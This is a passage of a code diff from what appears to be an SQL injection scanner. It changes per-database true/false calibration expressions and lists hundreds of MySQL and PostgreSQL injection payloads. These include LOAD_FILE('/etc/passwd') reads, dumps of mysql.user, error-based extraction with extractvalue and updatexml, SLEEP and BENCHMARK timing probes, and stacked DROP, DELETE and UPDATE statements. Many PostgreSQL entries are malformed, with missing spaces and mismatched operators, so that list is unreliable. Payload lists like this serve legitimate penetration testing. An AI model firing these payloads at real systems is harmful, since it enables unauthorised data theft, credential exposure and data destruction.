+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                 "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                 "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                 "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -166756,10 +166756,10 @@ class ConditionalErrorOracle:
 
         _ceo_cal_dbms = self._dbms or ''
         _ceo_cal_true = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":          "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
             "TiDB":           "LEAST(2e0,3e0)>(0e0)",
@@ -166775,10 +166775,10 @@ class ConditionalErrorOracle:
             "ClickHouse":     "least(2e0,3e0)>(0e0)",
         }.get(_ceo_cal_dbms, "1e0<2e0")
         _ceo_cal_false = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":          "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":        "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":           "GREATEST(2e0,3e0)<(0e0)",
@@ -171877,7 +171877,7 @@ MYSQL_EXOTIC_PAYLOADS = [' /*!50000*/UNION/*!50000*/SELECT 1,GROUP_CONCAT(table_
 MYSQL_HYBRID_PAYLOADS = [' AND/*!50000*/(SELECT/*!50000*/GROUP_CONCAT(user)/**/FROM/**/mysql.user)))', " AND/*!50000*/LOAD_FILE('/etc/passwd')", ' OR (LENGTH(DATABASE())>0)', ' UNION SELECT MD5(DATABASE()),SHA1(USER()),CRC32(VERSION()),UUID() WHERE LENGTH(DATABASE())>0', ' UNION SELECT @@version,@@datadir,3,4 WHERE 1<>0', " AND/*%09*/(LOAD_FILE('/etc/passwd'))", '; DROP TABLE IF EXISTS test WHERE 2>1', ' AND/*%09*/CASE/*%09*/WHEN/*%09*/1=1/*%09*/THEN/*%09*/SLEEP(1)/*%09*/END', ' AND IF(1<>2,SLEEP(0.5),0)', ' && 2>1', '; CREATE TABLE test(id INT); SELECT CASE WHEN 1<>2 THEN 1 ELSE 0 END', ' || (1=1)', ' AND NOT(1<>2)', ' && (1<>2)', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/**/@@datadir)))', " AND/*!50000*/(LOAD_FILE('/etc/passwd'))", ' OR/*!50000*/LENGTH(DATABASE())>0', ' AND LENGTH(DATABASE())>0', " AND NOT('a'='a')", ' OR/*%09*/2>1', ' OR/*%20*/1=1', ' AND/*%20*/2>1', '; CREATE TABLE test(id INT) WHERE IF(1=1,SLEEP(0.5),0)', ' AND/*%0a*/extractvalue(1,concat(0x7e,(SELECT/*%20*/@@version)))', ' AND/*%0a*/1<>2', '; INSERT INTO test VALUES(1); SELECT CASE WHEN 2>1 THEN 1 ELSE 0 END', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/*!50000*/@@version)))', ' UNION SELECT version(),user(),database(),@@datadir OR 1=1', " OR/*%09*/'a'='a'", ' && (1=1)', " AND/*%20*/'a'='a'", '; CREATE TABLE test(id INT) WHERE 2>1', ' AND/**/CASE/**/WHEN/**/1=1/**/THEN/**/SLEEP(1)/**/END', ' OR/*%20*/1=1/*%20*/OR/*%20*/(SELECT @@version)', ' AND/*!50000*/LENGTH(DATABASE())>0', " AND CASE WHEN LENGTH(DATABASE())>0 THEN BENCHMARK(1000000,'MD5(1)') ELSE 0 END", ' UNION SELECT 1,2,3,4; DROP TABLE IF EXISTS test', '; UPDATE test SET id=2 WHERE 2>1', ' AND/*!50000*/extractvalue(1,concat(0x7e,(SELECT/*!50000*/@@version)))', " OR/**/'a'='a'", " && NOT('a'='a')", ' && 1<>2', '; CREATE TABLE test(id INT) WHERE 1<>2', ' AND/*%09*/extractvalue(1,concat(0x7e,(SELECT/*%09*/database())))', ' UNION SELECT 1,2,3,4 WHERE 1=1', ' || NOT(1=1)', " AND 'a'='a' AND extractvalue(1,concat(0x7e,(SELECT @@version)))", ' AND/*%0a*/IF(1=1,SLEEP(1),0)/*!50000*/OR/*!50000*/1=1', ' AND/*%09*/1<>2', ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*%20*/@@datadir)))', ' OR 2>1', ' OR IF(1=1,SLEEP(0.5),0)', ' && NOT(1<>2)', ' && (2>1)', ' UNION SELECT IF(1=1,1,0),2,3,4 AND updatexml(1,concat(0x7e,(SELECT user())),1)', ' OR NOT(2>1)', ' AND/*!50000*/updatexml(1,concat(0x7e,(SELECT/*!50000*/database())),1)', ' AND/*!50000*/updatexml(1,concat(0x7e,(SELECT/*!50000*/@@datadir)),1)', ' AND/*%0a*/(SELECT/*%0a*/GROUP_CONCAT(user)/**/FROM/**/mysql.user)))', '; INSERT INTO test VALUES(1); SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END', '; UPDATE test SET id=2 WHERE 1<>2', ' AND IF((SELECT COUNT(*) FROM mysql.user)>0,updatexml(1,concat(0x7e,(SELECT database())),1),0)', '; DROP TABLE IF EXISTS test WHERE 1=1', " AND/**/1=1/**/AND/**/LOAD_FILE('/etc/passwd')", ' && NOT(LENGTH(DATABASE())>0)', ' OR/*%0a*/1=1', ' AND/*!50000*/IF(1=1,SLEEP(1),0)/*!50000*/OR/*!50000*/1=1', ' AND/*!50000*/extractvalue(1,concat(0x7e,(SELECT/*!50000*/COUNT(*) FROM mysql.user)))', ' AND/**/updatexml(1,concat(0x7e,(SELECT/**/@@datadir)),1)', ' OR 1<>2 OR updatexml(1,concat(0x7e,(SELECT database())),1)', ' OR IF(1<>2,SLEEP(0.5),0)', " AND/*%0a*/LOAD_FILE('/etc/passwd')", ' OR 1<>2', ' AND 1<>2 AND extractvalue(1,concat(0x7e,(SELECT @@version)))', ' AND NOT(1=1)', ' AND/*%20*/IF(1=1,SLEEP(1),0)', ' AND CASE WHEN 2>1 THEN SLEEP(0.5) ELSE 0 END', ' AND/*%09*/LENGTH(DATABASE())>0', '; UPDATE test SET id=2; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END', ' OR/*%09*/1<>2', ' || (LENGTH(DATABASE())>0)', ' AND/*!50000*/IF(1=1,SLEEP(1),0)/*%20*/OR/*%20*/1=1', ' AND/*%09*/updatexml(1,concat(0x7e,(SELECT/*%09*/@@datadir)),1)', ' AND IF(LENGTH(DATABASE())>0,SLEEP(1),0)', " AND IF(1<>2,BENCHMARK(1000000,'MD5(1)'),0)", ' AND/*%0a*/extractvalue(1,concat(0x7e,(SELECT/*!50000*/@@version)))', " || 'a'='a'", ' AND/*%20*/1=1', ' AND/*%0a*/extractvalue(1,concat(0x7e,(SELECT/*%09*/@@version)))', ' UNION SELECT version(),user(),database(),@@datadir WHERE LENGTH(DATABASE())>0', ' OR/*%0a*/LENGTH(DATABASE())>0', ' OR 1=1', ' UNION SELECT MD5(DATABASE()),SHA1(USER()),CRC32(VERSION()),UUID() OR 1=1', ' AND/*%20*/updatexml(1,concat(0x7e,(SELECT/*%20*/@@datadir)),1)', ' AND/*%09*/(SELECT/*%09*/GROUP_CONCAT(user)/**/FROM/**/mysql.user)))', " OR/*%0a*/'a'='a'", ' AND/*!50000*/IF(1=1,SLEEP(1),0)', " AND/*%20*/1=1/*%20*/AND/*%20*/LOAD_FILE('/etc/passwd')", ' && 1=1', ' AND/*%20*/1<>2', ' AND/**/(1=1)/**/AND/**/IF(1=1,SLEEP(1),0)', ' AND/**/LENGTH(DATABASE())>0', ' AND/*%20*/(GROUP_CONCAT(user) FROM mysql.user)', ' UNION SELECT 1,2,3,4 AND updatexml(1,concat(0x7e,(SELECT user())),1)', ' OR LENGTH(DATABASE())>0', ' OR/*!50000*/1=1/*!50000*/OR/*!50000*/(SELECT @@version)', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/**/database())))', ' OR 2>1 OR updatexml(1,concat(0x7e,(SELECT database())),1)', ' UNION SELECT MD5(DATABASE()),SHA1(USER()),CRC32(VERSION()),UUID() WHERE USER() IS NOT NULL', ' AND/**/updatexml(1,concat(0x7e,(SELECT/**/database())),1)', ' UNION SELECT MD5(DATABASE()),SHA1(USER()),CRC32(VERSION()),UUID() WHERE 1=1', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/**/@@version)))', " || NOT('a'='a')", '; DROP TABLE IF EXISTS test; SELECT CASE WHEN 2>1 THEN 1 ELSE 0 END', '; UPDATE test SET id=2 WHERE 1=1', ' AND/*%0a*/extractvalue(1,concat(0x7e,(SELECT/**/@@version)))', ' AND/*!50000*/(1=1)/*!50000*/AND/*!50000*/IF(1=1,SLEEP(1),0)', '; DROP TABLE IF EXISTS test; SELECT CASE WHEN 1<>2 THEN 1 ELSE 0 END', ' OR/*%20*/2>1', '; DELETE FROM test WHERE id=1; SELECT CASE WHEN 2>1 THEN 1 ELSE 0 END', ' AND/*!50000*/CASE/*!50000*/WHEN/*!50000*/1=1/*!50000*/THEN/*!50000*/SLEEP(1)/*!50000*/END', ' AND/*%20*/CASE/*%20*/WHEN/*%20*/1=1/*%20*/THEN/*%20*/SLEEP(1)/*%20*/END', ' OR/*%0a*/2>1', ' AND/*%20*/(@@version)', ' UNION SELECT 1,2,3,4 OR 1=1', ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*%20*/@@version)))', ' UNION SELECT version(),user(),database(),@@datadir AND 1=1', '; DROP TABLE IF EXISTS test WHERE 1<>2', ' AND/*%0a*/1=1', ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*%0a*/@@version)))', ' AND CASE WHEN 1=1 THEN SLEEP(1) ELSE 0 END', ' AND/*%20*/LENGTH(DATABASE())>0', " AND IF(1=1,BENCHMARK(1000000,'MD5(1)'),0)", '; DELETE FROM test WHERE id=1 WHERE 2>1', ' AND/**/(@@version)', ' AND NOT(LENGTH(DATABASE())>0)', '; INSERT INTO test VALUES(1) WHERE 1=1', ' OR (2>1)', ' AND (2>1)', ' AND/*%0a*/IF(1=1,SLEEP(1),0)', ' AND/*%09*/extractvalue(1,concat(0x7e,(SELECT/*%09*/COUNT(*) FROM mysql.user)))', ' OR/**/LENGTH(DATABASE())>0', ' AND/**/1=1', ' AND/*%0a*/extractvalue(1,concat(0x7e,(SELECT/*%0a*/@@version)))', ' AND 2>1', ' AND/**/IF(1=1,SLEEP(1),0)/*!50000*/OR/*!50000*/1=1', ' AND IF((SELECT COUNT(*) FROM mysql.user)>0,extractvalue(1,concat(0x7e,(SELECT @@version))),0)', ' AND/*%09*/IF(1=1,SLEEP(1),0)', ' UNION SELECT 1,2,3,4 AND extractvalue(1,concat(0x7e,(SELECT @@version)))', " || ('a'='a')", ' AND/*!50000*/IF(1=1,SLEEP(1),0)/*%09*/OR/*%09*/1=1', ' AND/**/1<>2', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/*%20*/@@version)))', ' AND/*%09*/1=1', ' UNION SELECT IF(1=1,1,0),2,3,4 AND extractvalue(1,concat(0x7e,(SELECT @@version)))', ' AND/*%09*/updatexml(1,concat(0x7e,(SELECT/*%09*/COUNT(*) FROM mysql.user)),1)', ' AND IF(1<>2,SLEEP(1),0)', ' || 1=1', ' AND 2>1 AND (SELECT GROUP_CONCAT(user) FROM mysql.user)', ' AND/*%20*/(1=1)/*%20*/AND/*%20*/IF(1=1,SLEEP(1),0)', ' || NOT(LENGTH(DATABASE())>0)', '; DELETE FROM test WHERE id=1; SELECT CASE WHEN 1<>2 THEN 1 ELSE 0 END', '; DROP TABLE IF EXISTS test; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END', ' OR NOT(1<>2)', " AND IF(2>1,BENCHMARK(1000000,'MD5(1)'),0)", '; INSERT INTO test VALUES(1); SELECT CASE WHEN 1<>2 THEN 1 ELSE 0 END', ' UNION SELECT version(),user(),database(),@@datadir; DROP TABLE IF EXISTS test', ' UNION SELECT 1,2,3,4; SHOW DATABASES', " AND CASE WHEN 1=1 THEN BENCHMARK(1000000,'MD5(1)') ELSE 0 END", ' AND 2>1 AND extractvalue(1,concat(0x7e,(SELECT @@version)))', '; INSERT INTO test VALUES(1) WHERE 1<>2', " AND CASE WHEN 2>1 THEN BENCHMARK(1000000,'MD5(1)') ELSE 0 END", " AND/*!50000*/1=1/*!50000*/AND/*!50000*/LOAD_FILE('/etc/passwd')", ' AND CASE WHEN LENGTH(DATABASE())>0 THEN SLEEP(1) ELSE 0 END', ' AND/*%09*/IF(1=1,SLEEP(1),0)/**/OR/**/1=1', ' AND 1<>2 AND (SELECT GROUP_CONCAT(user) FROM mysql.user)', ' && NOT(2>1)', ' AND/*!50000*/1<>2', " AND/*%20*/LOAD_FILE('/etc/passwd')", ' AND/*%0a*/updatexml(1,concat(0x7e,(SELECT/*%0a*/database())),1)', ' AND CASE WHEN 1<>2 THEN SLEEP(0.5) ELSE 0 END', ' UNION SELECT version(),user(),database(),@@datadir WHERE 1=1', ' OR/*!50000*/1<>2', ' AND/*%20*/IF(1=1,SLEEP(1),0)/*%0a*/OR/*%0a*/1=1', ' AND/**/updatexml(1,concat(0x7e,(SELECT/**/COUNT(*) FROM mysql.user)),1)', " AND 1<>2 AND LOAD_FILE('/etc/passwd')", ' AND/*%20*/(SELECT/*%20*/GROUP_CONCAT(user)/**/FROM/**/mysql.user)))', " AND IF(LENGTH(DATABASE())>0,BENCHMARK(1000000,'MD5(1)'),0)", " OR IF('a'='a',SLEEP(0.5),0)", ' || 2>1', ' && (LENGTH(DATABASE())>0)', ' AND IF(2>1,SLEEP(1),0)', ' OR/*%09*/1=1', ' AND/*%09*/updatexml(1,concat(0x7e,(SELECT/*%09*/@@version)),1)', ' AND/*!50000*/extractvalue(1,concat(0x7e,(SELECT/*%20*/@@version)))', '; INSERT INTO test VALUES(1) WHERE 2>1', ' AND/*%0a*/IF(1=1,SLEEP(1),0)/*%09*/OR/*%09*/1=1', ' OR/**/1<>2', ' AND polygon((select * from (select * from (select CASE WHEN 1=1 THEN 1 ELSE 0 END)a)b)) OR SLEEP(0.5)', ' AND multipolygon(((select * from (select * from (select IF(1=1,@@version,NULL))a)b))) WHERE 1=1', ' UNION SELECT 1,GROUP_CONCAT(user),3,4 FROM mysql.user WHERE USER() IS NOT NULL', " AND CASE WHEN 'a'='a' THEN SLEEP(0.5) ELSE 0 END", ' AND/**/(SELECT/**/GROUP_CONCAT(user)/**/FROM/**/mysql.user)))', " AND/**/'a'='a'", ' AND 1=1 AND (SELECT GROUP_CONCAT(user) FROM mysql.user)', " AND ('a'='a')", ' OR IF(2>1,SLEEP(0.5),0)', " AND 'a'='a' AND (SELECT GROUP_CONCAT(user) FROM mysql.user)", ' AND IF(1=1,extractvalue(1,concat(0x7e,(SELECT @@version))),0)', ' AND/*%0a*/CASE/*%0a*/WHEN/*%0a*/1=1/*%0a*/THEN/*%0a*/SLEEP(1)/*%0a*/END', ' AND/*%0a*/2>1', ' OR/*%20*/LENGTH(DATABASE())>0', ' AND/*%09*/extractvalue(1,concat(0x7e,(SELECT/*%09*/@@version)))', ' AND/*%09*/extractvalue(1,concat(0x7e,(SELECT/*%09*/@@datadir)))', ' AND/*%20*/updatexml(1,concat(0x7e,(SELECT/*%20*/@@version)),1)', ' UNION SELECT 1,2,3,4 AND 1=1', ' AND IF(LENGTH(DATABASE())>0,SLEEP(0.5),0)', ' UNION SELECT 1,2,3,4 WHERE LENGTH(DATABASE())>0', ' UNION SELECT 1,2,3,4 WHERE USER() IS NOT NULL', " AND 'a'='a' AND LOAD_FILE('/etc/passwd')", ' OR (1=1)', ' AND/*%09*/updatexml(1,concat(0x7e,(SELECT/*%09*/database())),1)', ' AND/*%20*/IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(1),0)', ' AND/*%0a*/IF(1=1,SLEEP(1),0)/**/OR/**/1=1', ' OR IF(LENGTH(DATABASE())>0,SLEEP(0.5),0)', ' AND 1<>2', ' AND/*!50000*/extractvalue(1,concat(0x7e,(SELECT/*!50000*/database())))', ' OR/**/1=1/**/OR/**/(SELECT @@version)', ' AND/**/2>1', ' AND IF(1=1,SLEEP(0.5),0)', " OR/*!50000*/'a'='a'", ' AND/*%09*/(@@version)', " AND/**/LOAD_FILE('/etc/passwd')", ' AND (LENGTH(DATABASE())>0)', " OR/*%20*/'a'='a'", ' OR/*!50000*/1=1', ' AND/*%0a*/IF(1=1,SLEEP(1),0)/*%20*/OR/*%20*/1=1', ' AND/*%20*/updatexml(1,concat(0x7e,(SELECT/*%20*/database())),1)', ' && NOT(1=1)', ' AND/**/IF(1=1,SLEEP(1),0)/*%20*/OR/*%20*/1=1', " AND IF('a'='a',BENCHMARK(1000000,'MD5(1)'),0)", '; DELETE FROM test WHERE id=1; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END', ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*%20*/COUNT(*) FROM mysql.user)))', " OR NOT('a'='a')", ' AND CASE WHEN 1=1 THEN SLEEP(0.5) ELSE 0 END', " && ('a'='a')", " OR ('a'='a')", ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*%20*/database())))', ' || 1<>2', " OR 'a'='a' OR updatexml(1,concat(0x7e,(SELECT database())),1)", ' AND 1 IN (WITH RECURSIVE cte AS (SELECT IF(1=1,1,0)) SELECT * FROM cte)', " AND/**/(LOAD_FILE('/etc/passwd'))", " AND IF((SELECT COUNT(*) FROM mysql.user)>0,extractvalue(1,concat(0x7e,(SELECT LOAD_FILE('/etc/passwd')))),0)", ' AND/**/updatexml(1,concat(0x7e,(SELECT/**/@@version)),1)', ' AND/*!50000*/IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(1),0)', ' AND/*%09*/2>1', " && 'a'='a'", " AND/*%09*/LOAD_FILE('/etc/passwd')", " AND CASE WHEN 1<>2 THEN BENCHMARK(1000000,'MD5(1)') ELSE 0 END", ' UNION SELECT MD5(DATABASE()),SHA1(USER()),CRC32(VERSION()),UUID() AND 1=1', ' AND/*!50000*/updatexml(1,concat(0x7e,(SELECT/*!50000*/@@version)),1)', ' OR NOT(LENGTH(DATABASE())>0)', ' OR/*%20*/1<>2', " AND CASE WHEN 'a'='a' THEN BENCHMARK(1000000,'MD5(1)') ELSE 0 END", ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/*!50000*/@@version)))', ' || NOT(2>1)', ' OR/*%09*/LENGTH(DATABASE())>0', '; DROP TABLE IF EXISTS test WHERE SLEEP(1) AND 1=1', '; UPDATE test SET id=2; SELECT CASE WHEN 1<>2 THEN 1 ELSE 0 END', ' || (1<>2)', " OR 'a'='a'", ' AND IF(2>1,SLEEP(0.5),0)', ' AND 1 IN (WITH RECURSIVE cte AS (SELECT 1 WHERE 1=1) SELECT SLEEP(1) FROM cte)', ' AND/*%20*/IF(1=1,SLEEP(1),0)/**/OR/**/1=1', ' || LENGTH(DATABASE())>0', ' AND CASE WHEN 1<>2 THEN SLEEP(1) ELSE 0 END', ' OR/*%0a*/1<>2', " AND/*!50000*/'a'='a'", ' AND/*%20*/extractvalue(1,concat(0x7e,(SELECT/**/@@version)))', ' AND/**/(GROUP_CONCAT(user) FROM mysql.user)', ' AND IF(1=1,updatexml(1,concat(0x7e,(SELECT database())),1),0)', ' AND/*%0a*/LENGTH(DATABASE())>0', ' OR NOT(1=1)', ' AND/*%09*/IF(1=1,SLEEP(1),0)/*%09*/OR/*%09*/1=1', ' AND NOT(2>1)', ' OR/**/2>1', " AND CASE WHEN 'a'='a' THEN SLEEP(1) ELSE 0 END", " AND IF('a'='a',SLEEP(0.5),0)", " AND 2>1 AND LOAD_FILE('/etc/passwd')", '; DELETE FROM test WHERE id=1 WHERE 1<>2', " AND IF('a'='a',SLEEP(1),0)", ' AND CASE WHEN 2>1 THEN SLEEP(1) ELSE 0 END', ' AND/**/extractvalue(1,concat(0x7e,(SELECT/**/COUNT(*) FROM mysql.user)))', ' AND (1=1)', ' AND (1<>2)', ' AND/**/IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(1),0)', ' OR/*!50000*/2>1', ' OR 1=1 OR updatexml(1,concat(0x7e,(SELECT database())),1)', ' || (2>1)', ' && LENGTH(DATABASE())>0']
 
 # PostgreSQL payloads
-POSTGRESQL_STANDARD_PAYLOADS = ['|| CASE WHEN ARRAY_LOWER(ARRAY[1,2,3],1)!~~LN(2.718) THEN 1 ELSE 0 END', '|| (SELECT COUNT(*)) IS NOT NULL', "|| TO_TIMESTAMP('2021-01-01','YYYY-MM-DD')::TEXT!~~SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT", "AND CHR(97)::INTEGERNOT ILIKETRIM('  a  ')", '|| LENGTH(POWER(3,2))<=LENGTH((SELECT COUNT(DISTINCT 1)))', "OR CAST(LENGTH('a') AS TEXT)NOT ILIKECAST(TRIM('  a  ') AS TEXT)", '|| (SIGN(-5)NOT BETWEENFALSE)', 'OR INET_SERVER_PORT() IN (SELECT 1 UNION SELECT 2)', '|| CASE WHEN (SELECT COUNT(*) FROM pg_tables)<(SELECT COUNT(*) FROM pg_views) THEN 1 ELSE 0 END', "OR (SELECT COUNT(*) FROM information_schema.columns)::INTEGERNOT BETWEENSHA1('test')", 'AND CAST(COUNT(1) AS TEXT)NOT LIKECAST(CEIL(3.1) AS TEXT)', "OR MD5('test') IN (SELECT 1 UNION SELECT 2)", "AND -1NOT INBIT_LENGTH('a')", 'AND MOD(10,3)::TEXTNOT BETWEENTRUE::TEXT', "OR RPAD('a',5,'0')::TEXT>=SHA1('test')::TEXT", 'AND (CAST(1 AS VARCHAR)<=ARRAY_UPPER(ARRAY[1,2,3],1))', "|| MD5('a')INARRAY_AGG(2)", 'AND (SELECT 1) IS NOT NULL', '|| CAST((~1) AS TEXT)!~~*CAST(12345 AS TEXT)', 'AND CASE WHEN ROUND(2.5)~~*EXTRACT(EPOCH FROM NOW()) THEN 1 ELSE 0 END', '|| MAX(1) IS NOT NULL', "AND CASE WHEN CHR(97)!=LTRIM('  a') THEN 1 ELSE 0 END", 'OR CURRENT_TIMESTAMP() IS NOT NULL', 'OR (SELECT COUNT(*) FROM information_schema.columns) IN (SELECT 1 UNION SELECT 2)', 'AND ROUND(2.5)::TEXT~~JSON_VALID(\'{"a":1}\')', 'AND CAST(1 AS NUMERIC)=CURRENT_TIME', '|| CAST(COUNT(DISTINCT 1) AS TEXT)>=CAST(ABS(-1) AS TEXT)', "OR LOWER('ADMIN')NOT LIKE'a'", 'AND LENGTH(\'test\')::INTEGERISJSONB_EACH(\'{"a":1}\')', '|| CURRENT_TIME IN (SELECT 1 UNION SELECT 2)', "AND (ENCODE(DIGEST('test','sha256'),'hex')LIKE(7|4))", 'AND -1 IN (SELECT 1 UNION SELECT 2)', "AND STRING_AGG('a',',')INVERSION()", "|| CAST((2>>1) AS TEXT)NOT BETWEENCAST(CONCAT('test','123') AS TEXT)", "AND CAST((1<<1) AS TEXT)!~~CAST(SPLIT_PART('a,b,c',',',1) AS TEXT)", "AND 'z'!~~(SELECT AVG(1))", '|| CAST(CURRENT_DATE AS TEXT)!~~CAST((8#3) AS TEXT)', "AND CAST((~1) AS TEXT)NOT BETWEENCAST(STRING_AGG('test',';') AS TEXT)", "AND CAST(CAST(1 AS CHAR) AS TEXT)=CAST(MD5('a') AS TEXT)", 'AND CASE WHEN CLOCK_TIMESTAMP()NOT ILIKETRUE THEN 1 ELSE 0 END', 'OR JSON_VALID(\'{"a":1}\') IN (SELECT 1 UNION SELECT 2)', 'AND JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', '|| LENGTH(NULL)BETWEENLENGTH(USER)', "AND CASE WHEN SUM(1)INCONCAT('a','b') THEN 1 ELSE 0 END", 'AND (CURRENT_DATE~~*FLOOR(100.1))', '|| FALSE::TEXTBETWEENCURRENT_DATE', '|| (1&1)IS0.1', '|| LN(2.718) IS NOT NULL', "AND SESSION_USER>=SUBSTR('abcdef',1,1)", 'OR 1::VARCHAR::INTEGERNOT BETWEEN(SELECT MAX(1))', "OR LTRIM('  a') IS NOT NULL", "|| STRING_AGG('a',',')::NUMERIC!~~(SELECT COUNT(DISTINCT 1))", "AND CAST(CONCAT('test','123') AS TEXT)>CAST(SIGN(0) AS TEXT)", 'AND (1&1)::NUMERIC~~STATEMENT_TIMESTAMP()', "|| ASCII('a')::TEXT<=(1|1)::TEXT", "|| INET_SERVER_PORT()::NUMERICINREPEAT('a',3)", "|| CAST((SELECT COUNT(*) FROM pg_views) AS TEXT)ILIKECAST(REPLACE('test','t','T') AS TEXT)", "AND CAST(CAST('1' AS NUMERIC) AS TEXT)NOT BETWEENCAST(CEIL(3.1) AS TEXT)", '|| SIGN(-5) IN (SELECT 1 UNION SELECT 2)', 'AND false::TEXTNOT ILIKECLOCK_TIMESTAMP()::TEXT', 'OR (EXP(1)<=PG_BACKEND_PID())', "OR CAST('1' AS INTEGER) IS NOT NULL", "AND CAST(CAST('1' AS INTEGER) AS TEXT)>CAST(1::NUMERIC AS TEXT)", 'AND (8#3) IS NOT NULL', "AND LOWER('ADMIN')=CAST(1 AS NUMERIC)", 'AND MOD(10,3)!=LN(2.718)', 'AND CAST(JSON_EXTRACT_PATH(\'{"a":1}\',\'a\') AS TEXT)IS NOTCAST(MIN(1) AS TEXT)', 'AND (SELECT COUNT(DISTINCT 1)) IN (SELECT 1 UNION SELECT 2)', 'OR CAST(1 AS VARCHAR)::TEXT!~~*CURRENT_TIME::TEXT', 'AND MOD(5,2)::TEXT<>(SELECT COUNT(*))::TEXT', '|| VERSION()::TEXT!=FLOOR(3.9)::TEXT', 'AND COUNT(*)+1NOT BETWEEN1+1', '|| LENGTH(CAST(1 AS TEXT))NOT LIKELENGTH(ARRAY_AGG(1))', "|| CEIL(3.9)INLPAD('a',5,'0')", 'AND CURRENT_SCHEMA() IS NOT NULL', "AND SHA256('test')~~DATE_TRUNC('month',NOW())", "AND (UPPER('a')ILIKEARRAY_LENGTH(ARRAY[1,2,3],1))", "|| MD5('postgres')<(1#1)", 'AND LN(2.718)::NUMERICINCURRENT_DATE', 'AND SQRT(144) IS NOT NULL', 'OR JSON_EXTRACT_PATH(\'{"a":1}\',\'a\')::TEXTILIKERTRIM(\'a  \')::TEXT', "AND LENGTH(INET_SERVER_PORT())~~LENGTH(SHA256('test'))", 'OR INET_SERVER_ADDR()=false', "OR (1#1)::TEXTINREPLACE('test','t','T')", 'AND CASE WHEN CURRENT_TIMEISCAST(1 AS DECIMAL) THEN 1 ELSE 0 END', 'AND MIN(1) IN (SELECT 1 UNION SELECT 2)', "AND (SELECT COUNT(*) FROM information_schema.columns)::TEXTLIKELPAD('a',5,'0')::TEXT", 'OR LENGTH((SELECT COUNT(*) FROM information_schema.tables))NOT LIKELENGTH((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables))', "AND CAST(SQRT(9) AS TEXT)!=CAST(TRIM('  a  ') AS TEXT)", "|| (LOWER('ADMIN')=1.5)", 'OR ROUND(2.5) IS NOT NULL', '|| CASE WHEN CURRENT_TIMENOT ILIKEPG_POSTMASTER_START_TIME() THEN 1 ELSE 0 END', 'AND CASE WHEN 1<>EXP(1) THEN 1 ELSE 0 END', 'AND CAST(1 AS DECIMAL)::TEXT~~*(SELECT SUM(1))::TEXT', "OR ASCII('a')::TEXTNOT LIKENOW()", 'AND MOD(5,2)::INTEGER=SQRT(144)', 'OR (SELECT 1)::INTEGER<AVG(1)', "OR CAST(ABS(-1) AS TEXT)BETWEENCAST(REPLACE('test','t','T') AS TEXT)", "AND LENGTH(POWER(2,2))<LENGTH(MD5('a'))", "AND SUBSTR('test',1,1) IS NOT NULL", "AND CAST(SIGN(-5) AS TEXT)!=CAST(STRING_AGG('a',',') AS TEXT)", '|| ARRAY_LENGTH(ARRAY[1,2,3],1) IS NOT NULL', "AND MD5('test') IS NOT NULL", 'AND CAST(false AS TEXT)!~~*CAST(SUM(2) AS TEXT)', 